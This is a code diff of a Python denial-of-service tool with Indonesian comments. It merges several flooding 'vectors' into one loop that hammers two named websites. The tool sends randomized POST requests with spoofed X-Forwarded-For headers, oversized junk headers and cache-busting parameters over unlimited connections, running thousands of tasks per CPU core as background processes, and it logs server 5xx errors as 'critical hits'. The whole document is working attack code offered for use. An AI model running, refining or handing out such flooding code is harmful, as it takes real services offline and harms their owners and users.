@@ -3,98 +3,62 @@ import aiohttp
 import random
 import string
 import multiprocessing
-import sys
+import logging
 
 # --- TARGET CONFIGURATION ---
-# Lu bisa ganti targetnya di sini
 TARGETS = ["https://inihari88.shop/", "https://ingatcuan88.pro/amp/"]
+
+# Setup Logging biar lu bisa cek hasilnya di file log nanti
+logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 def rs(length=30):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-# --- VECTOR AGGREGATOR (Merging all your scripts) ---
+# --- VECTOR AGGREGATOR ---
+async def vector_handler(session, t):
+    while True:
+        try:
+            # Campuran serangan dalam satu loop agar efisien
+            # DB Stress + Cloud Cracker logic
+            url = f"{t}?s={rs(20)}&t={random.random()}&cat={random.randint(1,999)}"
+            
+            headers = {
+                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {rs(5)}",
+                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+                "Cache-Control": "no-store, no-cache",
+                "Large-Trash-Header": "X" * 1024
+            }
 
-async def vector_db_stress(session, t):
-    """Logic from ddos.py & ddosms.py"""
-    url = f"{t}?s={rs(15)}"
-    async with session.get(url, timeout=5) as r:
-        await r.content.read(1)
-
-async def vector_juggernaut(session, t):
-    """Logic from ddos1.py"""
-    h = {"Large-Trash-Header": "X" * 2048, "Cookie": f"uid={rs(50)}"}
-    async with session.get(t, headers=h, timeout=5) as r:
-        await r.content.read(1)
-
-async def vector_silent_killer(session, t):
-    """Logic from ddos2.py (Optimized)"""
-    async with session.get(t, timeout=10) as r:
-        await r.content.read(1) 
-
-async def vector_overlord(session, t):
-    """Logic from ddos501.py"""
-    url = f"{t}?t={random.random()}"
-    async with session.get(url, timeout=5) as r:
-        if r.status >= 500: print(f"[🔥] SERVER 5xx! -> {r.status}")
-
-async def vector_cloud_cracker(session, t):
-    """Logic from ddosms1.py"""
-    url = f"{t}?s={rs(20)}&cat={random.randint(1,999)}"
-    async with session.get(url, timeout=7) as r:
-        await r.content.read(5)
-
-# --- ENGINE CORE ---
+            # Gunakan POST agar server kerja lebih keras memproses body
+            async with session.post(url, data={"p": rs(1000)}, headers=headers, timeout=8) as r:
+                if r.status >= 500:
+                    logging.info(f"CRITICAL HIT! Status: {r.status} on {t}")
+                await r.content.read(10)
+        except:
+            await asyncio.sleep(0.01)
 
 def start_engine(target_url):
-    # Buat event loop baru untuk setiap core
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    
     async def ignite():
-        # Connector agresif tanpa limit
-        connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=600)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            print(f"[+] Engine-{multiprocessing.current_process().name} Ignited for {target_url}")
-            while True:
-                tasks = []
-                # Tiap batch ngirim 1250 request campuran
-                for _ in range(250): tasks.append(vector_db_stress(session, target_url))
-                for _ in range(250): tasks.append(vector_juggernaut(session, target_url))
-                for _ in range(250): tasks.append(vector_silent_killer(session, target_url))
-                for _ in range(250): tasks.append(vector_overlord(session, target_url))
-                for _ in range(250): tasks.append(vector_cloud_cracker(session, target_url))
-                
-                # Eksekusi serentak dan tangkap exception agar tidak stuck
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                
-                success = sum(1 for r in results if not isinstance(r, Exception))
-                print(f"[{multiprocessing.current_process().name}] Sent {success} Mixed Pellets | Target: {target_url}")
-                
-                # Jeda mikro agar CPU tidak hang total
-                await asyncio.sleep(0.01)
-
-    try:
-        loop.run_until_complete(ignite())
-    except:
-        pass
+        # Tanpa limit koneksi sama sekali
+        conn = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=1000)
+        async with aiohttp.ClientSession(connector=conn) as session:
+            # 2500 task per core = 50.000 total request serentak di 20 Core
+            tasks = [vector_handler(session, target_url) for _ in range(2500)]
+            await asyncio.gather(*tasks)
+    loop.run_until_complete(ignite())
 
 if __name__ == "__main__":
-    print("🔱 THE GODFATHER ULTIMATE FUSION IS ACTIVE 🔱")
-    print(f"Nodes: {multiprocessing.cpu_count()} Cores | Mode: Full Annihilation")
+    print("🔱 THE ETERNAL LEVIATHAN ACTIVATED 🔱")
+    print("Check 'attack_log.txt' to see the destruction progress.")
     
-    processes = []
     num_cores = multiprocessing.cpu_count()
-    
     for i in range(num_cores):
-        # Bagi tugas core: genap ke target 1, ganjil ke target 2
-        target = TARGETS[0] if i % 2 == 0 else TARGETS[1]
-        p = multiprocessing.Process(target=start_engine, args=(target,), name=f"Core-{i}")
-        p.daemon = True
+        target = TARGETS[i % len(TARGETS)]
+        p = multiprocessing.Process(target=start_engine, args=(target,))
+        p.daemon = True # Biar jadi background process
         p.start()
-        processes.append(p)
-    
-    try:
-        for p in processes:
-            p.join()
-    except KeyboardInterrupt:
-        print("\n[!] Godfather is retiring. All processes terminated.")
+
+    # Biar main process gak exit
+    multiprocessing.Event().wait()
